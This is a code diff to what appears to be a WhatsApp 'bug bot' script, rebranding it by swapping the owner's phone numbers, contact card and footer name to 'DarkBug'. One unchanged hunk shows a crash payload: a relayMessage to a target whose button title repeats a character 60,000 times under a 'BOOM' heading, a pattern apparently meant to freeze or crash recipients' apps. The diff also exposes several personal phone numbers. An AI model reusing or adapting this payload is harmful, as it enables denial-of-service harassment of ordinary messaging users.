@@ -245,7 +245,7 @@ await sam.relayMessage(target, {
                                 buttonParamsJson: `{"title":"SPIDER-X🔐  ◄${"᬴".repeat(60000)}","sections":[{"title":"# BOOM̷","rows":[]}]}`
                             },
                         ],
-                        mentionedJid: ["2347088910126@s.whatsapp.net"],
+                        mentionedJid: ["2347030626048@s.whatsapp.net"],
                     },
                 },
             },
@@ -1131,7 +1131,7 @@ sam.sendMessage(m?.chat, {
         isForwarded: false,
         mentionedJid: [m?.sender],
         businessMessageForwardInfo: {
-            businessOwnerJid: "2349116057855@s.whatsapp.net"
+            businessOwnerJid: "2347030626048@s.whatsapp.net"
         },
         forwardedNewsletterMessageInfo: {
             newsletterJid: '120363297314470847@newsletter',
@@ -1291,7 +1291,7 @@ remoteJid: `status@broadcast`
 message: {
 'contactMessage': {
 'displayName': `C0D3 BR34K3R`,
-'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=2347088910126:+234 70-3062-6048\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
+'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=2347030626048:+234 70-3062-6048\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
 sendEphemeral: true
 }}
 }		
@@ -1311,7 +1311,7 @@ caption =`
 ┃◎ 𝙿𝚁𝙴𝙵𝙸𝚇 : ${prefix}
 ┃◎ 𝙿𝙸𝙽𝙶 : ${latensi.toFixed(4)}
 ┃◎ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${run}
-┃◎ 𝙾𝚆𝙴𝙽𝙴𝚁 𝙽𝚄𝙼 : +2347088910126
+┃◎ 𝙾𝚆𝙴𝙽𝙴𝚁 𝙽𝚄𝙼 : +2347030626048
 ┃◎ 𝙾𝚆𝙽𝙴𝚁 𝙽𝙰𝙼𝙴 : C0D3BR34K3R 
 ┗━━━━━━━━━━━━━━
    𝗢𝗪𝗡𝗘𝗥 𝗖𝗠𝗗
@@ -2049,7 +2049,7 @@ message: {
       "text": "Click Chech Host To Check Web"
     },
     "footer": {
-      "text": `𝙳𝚈𝙽𝙰𝙼𝙸𝙲-𝚅3`
+      "text": `𝔇𝔞𝔯𝔨𝔅𝔲𝔤-𝚅1`
     },
     "nativeFlowMessage": {
       "buttons": [
@@ -2096,7 +2096,7 @@ catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
 "thumbnail": messa.imageMessage,
 "jpegThumbnail": m,
 "firstImageId": 99999999,
-"url": "wa.me/5512981791389"
+"url": "wa.me/2347030626048"
 },
 "businessOwnerJid": from,
 }
